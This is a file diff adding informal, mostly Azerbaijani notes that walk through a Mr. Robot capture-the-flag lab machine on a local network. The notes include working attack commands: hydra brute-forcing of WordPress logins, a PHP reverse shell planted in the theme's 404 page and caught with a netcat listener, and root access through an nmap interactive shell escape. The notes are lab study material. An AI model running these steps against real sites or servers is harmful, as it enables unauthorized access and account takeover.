@@ -1,0 +1,98 @@
+kali 
+
+sudo su    kali 
+ping  (mrrobotda yazilan) 192.....
+
+nmap -p- 192.168.56.102   open olanlar var 
+kalide saytda ip addressi yaz 
+
+
+
+robots.txt         
+ads.txt              rovoads.txt
+humans.txt
+security.txt
+
+
+robotun icindekileri /sonra yaz  
+hansindansa parol cixacaq ,  o biri lugeti save ele
+kalide                                nikto -url https://192.168.56.102 
+/admin 
+/readme falan yoxla 
+sonra /wp-admin 
+
+extentionlardan burpsuite elave ele(kalinin)
+proxyden sayta gir wp admin olani kopyala
+her hansi pass yaz err gelecek inspectden bax string olmayana (invalid username)
+
+kalide yaz
+hydra -l testuser -p testparol 192.168.56.102 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:Invalid username.'
+
+hec ne tapmir 
+downloadsdaki fayla gir , cd ls cat zadnan 
+cat siyahi.txt -n    qisaltsin deye
+
+cat ders.txt | sort | uniq-u   yazma 
+        cat siyahi.txt | sort | uniq > ders.txt   yaz  
+
+hydra -L ders.txt -p testparol 192.168.56.102 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:Invalid username.'      (username tapir) poppetg
+
+hydra -l poppetg -P ders.txt 192.168.56.102 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:The password you entered for the username.'   (parol tapir) 05800580
+
+
+googledan https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+kopyala  linuxdaki appearance edit 404 du deyis
+
+ip deyis  (terminalda    ip a    yaz ip ni gotur)
+port deyis (herhansi port yaz 8081 islmese deyis)
+
+terminala get 
+nc -nvlp 8081    saytda /den sonra nese yazki 404 gelsin amma hec ne gelmiyecek 
+terminalda nc yazdigin dayanacaq yeni bos terminal acilir $ la baslayan
+ls yaz gorursen isleyir 
+
+find / -type f -name "*code-2-of-4.txt" 2>/dev/null
+
+/opt/bitnami/apps/wordpress/htdocs/xikaxecclv6blevbuojtfdxy7t3z3qpa8wze3xzg-ServerS50-code-2-of-4.txt
+cd ele gir 
+orda txt fayli var qeribe adli cat ele 
+69bfd5d64e5b9ce3f148fe4d501911f9cf7d689e (parol)   2 sual tapildi 
+
+
+6 robot userin parolu
+
+cd ~/
+ls
+cd /home   ls      
+cd robot  2 sey var            
+cat password.raw-base64 | base64 -d        robot:crusher
+
+
+7 robotun  icindekinin parolu 
+
+python -c 'import pty; pty.spawn("/bin/sh")' 
+
+su robot           pass: crusher
+ls   cat ele code 3 olani  
+e29d385f947b97956dffb89fd16888cac4e1d086 (parol)
+
+
+8 rootun icindeki parol
+robot@MrRobotS50 deyik  
+cat /etc/passwd    robot olani tap 
+find / -perm -4000 -type f 2>/dev/null
+/usr/local/bin/nmap localhost 
+/usr/local/bin/nmap --interactive
+ !sh
+whoami
+cd /root
+ls
+cat ele
+
+
+
+
+
+
+
+
